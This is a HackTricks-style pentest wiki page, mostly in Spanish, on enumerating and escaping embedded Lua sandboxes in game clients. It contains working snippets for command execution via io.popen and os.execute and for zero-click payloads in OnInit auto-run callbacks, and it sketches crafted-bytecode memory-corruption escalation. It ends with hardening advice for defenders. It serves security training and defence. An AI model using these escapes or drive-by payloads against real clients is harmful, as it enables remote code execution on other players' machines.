# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Esta página recopila técnicas prácticas para enumerar y escapar de "sandboxes" de Lua embebidos en aplicaciones (notablemente game clients, plugins o in-app scripting engines). Muchos engines exponen un entorno Lua restringido, pero dejan globals potentes alcanzables que permiten ejecución arbitraria de comandos o incluso corrupción nativa de memoria cuando los bytecode loaders están expuestos.

Ideas clave:
- Trata la VM como un entorno desconocido: enumera _G y descubre qué primitivas peligrosas están accesibles.
- Cuando stdout/print está bloqueado, abusa de cualquier canal de UI/IPC dentro de la VM como un sumidero de salida para observar resultados.
- Si io/os está expuesto, a menudo tienes ejecución directa de comandos (io.popen, os.execute).
- Si load/loadstring/loadfile están expuestos, ejecutar bytecode de Lua creado puede subvertir la seguridad de memoria en algunas versiones (≤5.1 los verificadores son evadibles; 5.2 eliminó el verificador), habilitando explotación avanzada.

## Enumerar el entorno sandboxed

- Vuelca el entorno global para inventariar tablas/funciones alcanzables:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Si no hay print() disponible, reutiliza canales in-VM. Ejemplo de una VM de script de housing de un MMO donde la salida del chat solo funciona después de una llamada de sonido; lo siguiente construye una función de salida fiable:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generaliza este patrón para tu target: cualquier textbox, toast, logger o UI callback que acepte strings puede actuar como stdout para reconnaissance.

## Ejecución directa de comandos si io/os está expuesto

Si el sandbox todavía expone las bibliotecas estándar io or os, probablemente tengas ejecución de comandos inmediata:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notas:
- La ejecución ocurre dentro del proceso del cliente; muchas capas anti-cheat/antidebug que bloquean external debuggers no impedirán la creación de procesos in-VM.
- Revisa también: package.loadlib (carga arbitraria de DLL/.so), require con módulos nativos, LuaJIT's ffi (si está presente), y la debug library (puede elevar privilegios dentro de la VM).

## Zero-click triggers via auto-run callbacks

Si la aplicación host envía scripts a los clientes y la VM expone auto-run hooks (p. ej., OnInit/OnLoad/OnEnter), coloca tu payload allí para drive-by compromise tan pronto como se cargue el script:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Cualquier callback equivalente (OnLoad, OnEnter, etc.) generaliza esta técnica cuando los scripts se transmiten y se ejecutan automáticamente en el cliente.

## Dangerous primitives to hunt during recon

Durante la enumeración de _G, busca específicamente:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: ejecutar código fuente o bytecode; admite cargar bytecode no confiable.
- package, package.loadlib, require: carga dinámica de librerías y la interfaz del módulo.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- Solo LuaJIT: ffi.cdef, ffi.load para llamar a código nativo directamente.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalada opcional: abuso de los cargadores de bytecode de Lua

Cuando load/loadstring/loadfile son alcanzables pero io/os están restringidos, la ejecución de bytecode de Lua creado puede conducir a divulgación de memoria y primitivas de corrupción. Datos clave:
- Lua ≤ 5.1 incluía un bytecode verifier que tiene bypasses conocidos.
- Lua 5.2 eliminó el verifier por completo (postura oficial: las aplicaciones deberían simplemente rechazar los precompiled chunks), ampliando la superficie de ataque si la carga de bytecode no está prohibida.
- Workflows típicos: leak pointers vía in-VM output, craft bytecode para crear type confusions (p. ej., alrededor de FORLOOP u otros opcodes), y luego pivotar a arbitrary read/write o native code execution.

This path is engine/version-specific and requires RE. See references for deep dives, exploitation primitives, and example gadgetry in games.

## Notas de detección y hardening (para defensores)

- Server side: reject or rewrite user scripts; allowlist safe APIs; strip or bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: run Lua con un _ENV mínimo, forbid bytecode loading, reintroduce un strict bytecode verifier o signature checks, y bloquear la creación de procesos desde el proceso cliente.
- Telemetry: alert on gameclient → child process creation shortly after script load; correlate con UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
